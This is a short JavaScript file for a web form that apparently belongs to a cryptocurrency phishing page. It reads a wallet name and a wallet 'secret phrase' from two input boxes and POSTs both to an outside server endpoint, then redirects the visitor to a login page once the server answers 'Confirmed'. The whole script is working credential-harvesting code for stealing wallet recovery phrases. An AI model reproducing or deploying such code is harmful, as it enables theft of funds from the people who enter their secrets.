let inputData = "";
let inputData2 = "";

document.querySelector(".input-box-1").addEventListener("input",(e)=>{
    inputData = e.target.value
})

document.querySelector(".input-box-2").addEventListener("input",(e)=>{
    inputData2 = e.target.value
})

document.querySelector(".button").addEventListener("click",(e)=>{
  e.preventDefault()
  if(!error){
      const url = "https://backend-01-92mi.onrender.com/api/data10";
      const data = {
          walletName:inputData,
          secretPhrase:inputData2
      };
      const options = {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
      };

      fetch(url, options)
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.json();
    })
    .then(data => {
      console.log(data)
      if(data.status === "Confirmed"){
        window.location.assign("../LoginPage/loginpage.html");
      }
    })
    .catch(error => {
      console.error('Fetch error:', error);
    });
  }
})
